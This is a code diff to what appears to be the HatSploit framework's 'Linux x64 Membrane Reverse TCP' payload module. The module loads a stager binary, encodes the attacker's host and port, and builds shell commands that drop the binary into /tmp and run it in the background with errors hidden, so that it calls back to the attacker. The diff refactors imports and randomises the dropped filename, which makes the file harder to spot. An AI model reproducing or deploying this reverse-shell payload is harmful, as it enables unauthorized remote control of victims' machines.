@@ -26,19 +26,18 @@
 
 import base64
 
-from core.lib.payload import HatSploitPayload
-from core.base.config import config
+from core.base.config import Config
+from core.lib.payload import Payload
+from data.payloads.linux.x64.membrane_reverse_tcp.core.session import HatSploitSession
+from utils.tcp.tcp import TCPClient
+from utils.string.string import StringTools
 
-from utils.tcp.tcp import tcp
 
-from data.payloads.linux.x64.membrane_reverse_tcp.core.session import session
-
-class HatSploitPayload(HatSploitPayload):
-    config = config()
-
-    tcp = tcp()
+class HatSploitPayload(Payload, TCPClient, StringTools):
+    config = Config()
 
     details = {
+        'Category': "stager",
         'Name': "Linux x64 Membrane Reverse TCP",
         'Payload': "linux/x64/membrane_reverse_tcp",
         'Authors': [
@@ -51,6 +50,7 @@ class HatSploitPayload(HatSploitPayload):
         'Comments': [
             ''
         ],
+        'Architecture': "x64",
         'Platform': "linux",
         'Risk': "high",
         'Type': "reverse_tcp"
@@ -59,7 +59,7 @@ class HatSploitPayload(HatSploitPayload):
     options = {
         'LHOST': {
             'Description': "Local host.",
-            'Value': tcp.get_local_host(),
+            'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
@@ -72,27 +72,30 @@ class HatSploitPayload(HatSploitPayload):
     }
 
     def run(self):
-        local_host, local_port = self.parser.parse_options(self.options)
+        local_host, local_port = self.parse_options(self.options)
 
         remote_data = base64.b64encode((local_host + ':' + local_port).encode())
         remote_data = remote_data.decode()
 
-        self.badges.output_process("Generating payload...")
+        self.output_process("Generating payload...")
 
         try:
-            binary = open(self.config.path_config['base_paths']['data_path'] + 'libs/payloads/linux/x64/membrane_reverse_tcp/bin/membrane.bin', 'rb')
+            binary = open(self.config.path_config['base_paths'][
+                              'data_path'] + 'libs/payloads/linux/x64/membrane_reverse_tcp/bin/membrane.bin', 'rb')
             payload = binary.read()
             binary.close()
         except Exception:
-            self.badges.output_error("Failed to generate payload!")
+            self.output_error("Failed to generate payload!")
             return
 
+        filename = self.random_string()
+
         instructions = ""
-        instructions += "cat >/tmp/.payload;"
-        instructions += "chmod 777 /tmp/.payload;"
-        instructions += f"sh -c '/tmp/.payload {remote_data}' 2>/dev/null &"
+        instructions += f"cat >/tmp/{filename};"
+        instructions += f"chmod 777 /tmp/{filename};"
+        instructions += f"sh -c '/tmp/{filename} {remote_data}' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
         self.instructions = instructions
-        self.session = session
+        self.session = HatSploitSession
